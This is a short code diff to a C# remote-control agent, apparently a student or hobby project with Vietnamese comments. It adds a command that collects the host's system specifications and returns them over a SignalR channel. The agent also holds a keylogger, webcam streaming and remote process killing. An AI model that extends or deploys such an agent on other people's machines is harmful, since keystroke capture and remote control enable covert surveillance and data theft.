@@ -54,11 +54,13 @@ namespace RCS.Agent
         private static SystemControl _systemControl;
         private static MediaCapture _mediaCapture;
         private static Keylogger _keylogger;
+        private static SystemInfoManager _sysInfoManager; 
 
         // Biến phục vụ Streaming
         private static CancellationTokenSource _webcamCts; 
         private static UdpClient _udpClient;               
         private static int _frameSequence = 0;   
+
 
         #endregion
 
@@ -128,6 +130,7 @@ namespace RCS.Agent
             _mediaCapture = new MediaCapture();
             _keylogger = new Keylogger();
             _udpClient = new UdpClient();
+            _sysInfoManager = new SystemInfoManager();
 
             // Khởi tạo SignalR và đăng ký sự kiện nhận lệnh
             _signalRClient = new SignalRClient(SERVER_URL_FINAL);
@@ -175,6 +178,10 @@ namespace RCS.Agent
                             _processMonitor.KillProcess(pid);
                         }
                         await SendResponse(cmd.Action, "killed");
+                        break;
+                    case ProtocolConstants.ActionGetSystemSpecs:
+                        var specs = _sysInfoManager.GetSpecs();
+                        await SendResponse(cmd.Action, specs);
                         break;
 
                     // --- NHÓM 3: HỆ THỐNG (SYSTEM & SCREENSHOT) ---
